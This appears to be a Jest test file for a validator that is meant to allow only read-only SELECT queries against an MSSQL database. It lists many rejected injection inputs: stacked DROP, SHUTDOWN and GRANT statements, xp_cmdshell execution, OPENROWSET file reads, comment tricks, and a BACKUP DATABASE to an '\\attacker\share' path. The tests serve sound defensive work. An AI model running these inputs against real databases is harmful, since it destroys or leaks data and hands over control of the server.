import { validateReadOnlyMssqlQuery } from '../../packages/server/src/mssql-settings';

const READ_ONLY = 'Nur lesende SELECT-Abfragen sind erlaubt';

// C-A18: the read-only guard let SELECT … INTO and further statements in the same batch through.
describe('read-only MSSQL query validation', () => {
  test.each([
    'SELECT * INTO dbo.pwned FROM dbo.tKunde',
    'SELECT 1 AS ok INTO #tmp',
    'WITH x AS (SELECT 1 AS a) SELECT a INTO dbo.pwned2 FROM x',
    "SELECT'x'INTO dbo.t",
    'SELECT 1; DISABLE TRIGGER ALL ON dbo.tKunde',
    'SELECT 1; ENABLE TRIGGER ALL ON dbo.tKunde',
    'SELECT 1; DENY SELECT ON dbo.tKunde TO public',
    'SELECT 1; SHUTDOWN',
    'SELECT 1 SHUTDOWN WITH NOWAIT',
    'SELECT 1; KILL 53',
    'SELECT 1; DBCC CHECKDB',
    'SELECT 1; RECONFIGURE',
    "SELECT 1; WAITFOR DELAY '00:05:00'",
    'SELECT 1; USE master',
    'SELECT 1; SET IDENTITY_INSERT dbo.t ON',
    'SELECT 1; DECLARE @x INT',
    "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;Trusted_Connection=yes;', 'SELECT 1')",
    "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t",
    "SELECT * FROM OPENQUERY(lnk, 'SELECT 1')",
    "SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\x.txt', SINGLE_CLOB) AS x",
    "SELECT 1; BACKUP DATABASE eazybusiness TO DISK='\\\\attacker\\share\\x.bak'",
    "SELECT 1; RESTORE DATABASE eazybusiness FROM DISK='C:\\x.bak'",
    'SELECT 1; GRANT CONTROL TO public',
    'SELECT 1; REVOKE SELECT ON dbo.t FROM public',
    'SELECT 1; CHECKPOINT',
    "SELECT 1; EXEC xp_cmdshell 'dir'",
    'SELECT 1; EXECUTE sp_who',
    'SELECT 1; INSERT INTO t VALUES (1)',
    'SELECT 1; UPDATE t SET a = 1',
    'SELECT 1; DELETE FROM t',
    'SELECT 1; MERGE t USING s ON 1 = 1 WHEN MATCHED THEN DELETE;',
    'SELECT 1; DROP TABLE t',
    'SELECT 1; ALTER TABLE t ADD c INT',
    'SELECT 1; CREATE TABLE t (a INT)',
    'SELECT 1; TRUNCATE TABLE t',
    'SELECT 1 BEGIN TRAN SELECT * FROM t WITH (TABLOCKX, HOLDLOCK)',
    'SELECT 1 WHILE 1 = 1 SELECT 1',
    'SELECT 1; ADD SENSITIVITY CLASSIFICATION TO dbo.t.c WITH (LABEL = \'x\')',
    'SELECT 1; RECEIVE TOP (1) * FROM dbo.q',
    'SELECT 1; SELECT 2',
    'SELECT 1;;',
    'SELECT 1 -- Kommentar\nDROP TABLE t',
    // Nested block comment: T-SQL ends it only at the second */, so the quote is inside it.
    "SELECT 1 /* a /* b */ ' */ DROP TABLE t --'",
  ])('rejects %j', (query) => {
    expect(validateReadOnlyMssqlQuery(query)).toEqual({ ok: false, error: READ_ONLY });
  });

  test.each(["SELECT 'offen", 'SELECT 1 /* offen', 'SELECT [offen FROM t', 'SELECT 1 /* a /* b */'])(
    'rejects unterminated %j',
    (query) => {
      expect(validateReadOnlyMssqlQuery(query)).toMatchObject({ ok: false });
    },
  );

  test.each([
    [' SELECT TOP 1 1 AS ok ', 'SELECT TOP 1 1 AS ok'],
    ['SELECT TOP 10 1 AS ok', 'SELECT TOP 10 1 AS ok'],
    ['SELECT TOP 10 cFirma, cMail FROM tFirma', 'SELECT TOP 10 cFirma, cMail FROM tFirma'],
    [
      "SELECT TOP 1 cStatus, cTrackingId FROM tBestellung WHERE cEmail = 'update@firma.de' ORDER BY dErstellt DESC",
      "SELECT TOP 1 cStatus, cTrackingId FROM tBestellung WHERE cEmail = 'update@firma.de' ORDER BY dErstellt DESC",
    ],
    ['WITH rows AS (SELECT 1 AS ok) SELECT * FROM rows', 'WITH rows AS (SELECT 1 AS ok) SELECT * FROM rows'],
    [
      'WITH offen AS (SELECT kBestellung, kKunde FROM tBestellung WHERE nStorno = 0) ' +
        'SELECT k.cKundenNr, COUNT(*) AS n FROM offen o JOIN tkunde k ON k.kKunde = o.kKunde ' +
        'WHERE k.kKunde IN (SELECT kKunde FROM tRechnung) GROUP BY k.cKundenNr;',
      'WITH offen AS (SELECT kBestellung, kKunde FROM tBestellung WHERE nStorno = 0) ' +
        'SELECT k.cKundenNr, COUNT(*) AS n FROM offen o JOIN tkunde k ON k.kKunde = o.kKunde ' +
        'WHERE k.kKunde IN (SELECT kKunde FROM tRechnung) GROUP BY k.cKundenNr;',
    ],
    ['SELECT [Set], [Into] FROM dbo.[Update Log]', 'SELECT [Set], [Into] FROM dbo.[Update Log]'],
    ["SELECT N'a;b' AS x, 'It''s' AS y", "SELECT N'a;b' AS x, 'It''s' AS y"],
    ['SELECT DATEADD(day, 1, dErstellt) AS d FROM tBestellung', 'SELECT DATEADD(day, 1, dErstellt) AS d FROM tBestellung'],
    // Comments never reach the server, so what runs is exactly what was checked.
    ['-- Kopf\nSELECT 1 AS ok /* DROP ist hier nur Text */', 'SELECT 1 AS ok'],
  ])('accepts %j', (query, executed) => {
    expect(validateReadOnlyMssqlQuery(query)).toEqual({ ok: true, query: executed });
  });
});
